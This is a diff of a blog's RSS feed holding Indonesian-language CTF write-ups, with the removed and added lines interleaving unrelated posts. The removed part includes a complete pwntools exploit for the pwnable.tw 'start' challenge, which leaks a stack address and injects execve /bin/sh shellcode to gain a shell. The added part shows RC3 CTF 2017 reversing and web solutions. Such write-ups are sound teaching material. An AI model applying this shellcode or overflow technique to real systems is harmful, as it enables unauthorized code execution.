-    Arch:     i386&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;32&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;little
-    RELRO:    No RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (&lt;span style=&quot;color:#3387cc;&quot;&gt;0x8048000&lt;/span&gt;)
+        <title>RC3 CTF 2017 Write Up</title>
+        <description>&lt;h1 id=&quot;reversing-100&quot;&gt;Reversing (100)&lt;/h1&gt;
 
-&lt;/pre&gt;
-&lt;p&gt;Hasil disassembly menggunaan Binary Ninja pada fungsi _start
-&lt;img class=&quot;wp-image-95 size-lodestar-featured-image aligncenter&quot; src=&quot;https://bytetolong.files.wordpress.com/2017/11/screenshot_2017-11-13_20-13-39.png?w=433&amp;amp;h=482&amp;amp;crop=1&quot; alt=&quot;&quot; width=&quot;433&quot; height=&quot;482&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;Diketahui bahwa binary start ditulis menggunakan asm x86 dan menggunakan 3 syscall yaitu write, read dan exit. Referensi tentang syscall dapat dilihat &lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;disini&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Pada bagian warna biru adalah proses pemanggilan syscall write dan bagian warna merah adalah pemanggilan syscall read . Lalu bagian kuning paling bawah adalah prospes stack akan di naikan sebanyak 20 bytes, sehingga Top Of Stack nya adalah alamat dari fungsi _exit dan program akan loncat ke fungsi _exit untuk mengakhiri eksekusi.&lt;/p&gt;
-&lt;p&gt;Apabila code nya di convert ke C kira-kira seperti berikut&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;void main(void){
-    char buf[&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;] &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Let's start the CTF:&quot;&lt;/span&gt;;
-    write(&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;,buf,&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;);
-    read(&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;,buf,&lt;span style=&quot;color:#3387cc;&quot;&gt;60&lt;/span&gt;)
-    exit();
-}
-void exit(){
-    exit(&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;);
-}
-&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;How To Get A Shell ?&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Karena binary nya sama sekali tidak memiliki proteksi, kita dapat dengan mudah inject shellcode lalu loncat ke shellcode berada. Dengan asumsi bahwa ASLR dalam keadaaan ON, kita dapat meleak Stack Address lalu mengkalkulasikan jarak antara Stack address dan tempat shellcode berada.&lt;/p&gt;
-&lt;p&gt;Pada dasar nya program start akan mem PUSH 28 bytes data ke dalam stack, berikut Layout Stack nya&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-Top Of Stack &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x2774654c&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'Let''&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x74732073&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 's st'&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x20747261&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'art '&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x20656874&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'the '&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x3a465443&lt;/span&gt;  &lt;span style=&quot;color:#e28964;&quot;&gt;| // 'CTF:'&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;  &lt;span style=&quot;color:#3387cc;&quot;&gt;0x804809d&lt;/span&gt;   &lt;span style=&quot;color:#e28964;&quot;&gt;| // syscall_exit&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;     esp      &lt;span style=&quot;color:#e28964;&quot;&gt;|&lt;/span&gt;
-                &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;
-&lt;/pre&gt;
-&lt;p&gt;Dari Layout Stack diatas dapat di pastikan untuk mengoverwrite Return Address atau EIP nya dibutuhkan 20 bytes. Lalu arahkan eksekusi program ke instruksi mov ecx, esp (pada alamat : 0x8048087). sehingga program akan mengluarkan output yang berisi Stack Address.&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; pwn &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;
+&lt;p&gt;Diberikan file elf 64bit not stripped.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;file hello
+hello: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Hanya dengan menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; didapatkan Flag yang benar.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;strings hello | grep RC
+RC3-2017&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;little_ball_of_fur&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Cukup mudah untuk challenge dengan points 100 :)
+Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3-2017{little_ball_of_fur}&lt;/code&gt;&lt;/p&gt;
 
-context(&lt;span style=&quot;color:#3e87e3;&quot;&gt;arch&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;i386&quot;&lt;/span&gt;,&lt;span style=&quot;color:#3e87e3;&quot;&gt;os&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;linux&quot;&lt;/span&gt;)
+&lt;h1 id=&quot;web-100&quot;&gt;Web (100)&lt;/h1&gt;
 
-&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# http://shell-storm.org/shellcode/files/shellcode-811.php&lt;/span&gt;
-shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;
-shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x31&lt;/span&gt;\xc0&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x50&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x68&lt;/span&gt;\x2f\x2f&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x73&lt;/span&gt;&quot;&lt;/span&gt;
-shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x68&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x68&lt;/span&gt;\x2f&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x62&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x69&lt;/span&gt;\x6e&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x89&lt;/span&gt;&quot;&lt;/span&gt;
-shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;\xe3&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x89&lt;/span&gt;\xc1&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x89&lt;/span&gt;\xc2\xb0\x0b&quot;&lt;/span&gt;
-shellcode &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;\xcd&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x80&lt;/span&gt;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x31&lt;/span&gt;\xc0&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x40&lt;/span&gt;\xcd&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x80&lt;/span&gt;&quot;&lt;/span&gt;
-mov_ecx_esp &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; p32(&lt;span style=&quot;color:#3387cc;&quot;&gt;0x08048087&lt;/span&gt;)
+&lt;p&gt;Diberikan sebuah website ()[http://13.59.6.98]&lt;/p&gt;
 
-start &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; remote(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;chall.pwnable.tw&quot;&lt;/span&gt;,&lt;span style=&quot;color:#3387cc;&quot;&gt;10000&lt;/span&gt;)
-start.recvuntil(&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;CTF:&quot;&lt;/span&gt;)
-payload &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; mov_ecx_esp
-start.send(payload)
-stack&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; start.recv(&lt;span style=&quot;color:#3387cc;&quot;&gt;4&lt;/span&gt;)
-stack_addr &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; u32(stack)
-&lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#dad085;&quot;&gt;hex&lt;/span&gt;(stack_addr)
-payload_next&lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;p32(stack_addr&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#3387cc;&quot;&gt;20&lt;/span&gt;)&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&lt;span style=&quot;color:#ddf2a4;&quot;&gt;\x90&lt;/span&gt;&quot;&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;4&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; shellcode 
-start.sendline(payload_next) 
-start.interactive()
-&lt;/pre&gt;
-&lt;/article&gt;
-</description>
-        <pubDate>Mon, 20 Nov 2017 00:00:00 +0700</pubDate>
-        <link>https://rhama.my.id/ctf/2017/11/20/pwnabletw-start.html</link>
-        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/20/pwnabletw-start.html</guid>
-        
-        <category>Pwnabletw</category>
-        
-        <category>CTF</category>
-        
-        
-        <category>CTF</category>
-        
-      </item>
-    
-      <item>
-        <title>Cyber Jawara 2017 - Write Up</title>
-        <description>&lt;article class=&quot;post-content&quot;&gt;
-&lt;p&gt;Berikut adalah write up penyisihan Cyber Jawara 2017 dari tim Rules Of Pwning (ROP).&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/0B7LFGSP-Hb3qY2xySTU2bU5yRWc/view?usp=sharing&quot;&gt;Write Up Cyber Jawara 2017&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3 style=&quot;text-align: center;&quot;&gt;&lt;em&gt;&quot;Tiada Daya dan Upaya Melainkan Pertolongan Allah&quot;&lt;/em&gt;&lt;/h3&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;/article&gt;
-</description>
-        <pubDate>Mon, 20 Nov 2017 00:00:00 +0700</pubDate>
-        <link>https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017.html</link>
-        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/20/cyber-jawara-2017.html</guid>
-        
-        <category>CyberJawara2017</category>
-        
-        <category>CTF</category>
-        
-        
-        <category>CTF</category>
-        
-      </item>
-    
-      <item>
-        <title>Cyber Jawara 2017 Final - echo (pwn 200)</title>
-        <description>&lt;article class=&quot;post-content&quot;&gt;
-&lt;p&gt;&lt;img class=&quot;size-medium aligncenter&quot; src=&quot;http://acehraya.co.id/wp-content/uploads/2015/09/codepolitan-header-cyber-jawara2.png&quot; width=&quot;700&quot; height=&quot;350&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;Diberikan sebuah file elf binary 64 bit dengan nama echo&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ file &lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt;
-&lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt;: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, &lt;span style=&quot;color:#e28964;&quot;&gt;for&lt;/span&gt; &lt;span style=&quot;color:#3e87e3;&quot;&gt;GNU/Linux&lt;/span&gt; 2.6.32, BuildID[sha1]=c5e63f048eccc18550211a8582dd02c44874ba61, stripped
-&lt;/pre&gt;
-&lt;p&gt;Dengan proteksi sebagai berikut&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ checksec &lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt;
-[&lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt;] &lt;span style=&quot;color:#65b042;&quot;&gt;'echo'&lt;/span&gt;
-    Arch:     amd64-64-little
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;curl http://13.59.6.98
+&amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0; url=C.html&quot;&lt;/span&gt; /&amp;gt; &amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Website tersebut akan otomatis direfresh apabila dikunjungi via Browser. Tapi terdapat bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt;&lt;/code&gt; yang seperti nya adalah flag nya apabila mengikuti bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;url=C.html&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Berikut script yang digunakan untuk melakukan automasi.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://13.59.6.98&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;p hidden&amp;gt;(.*?)&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
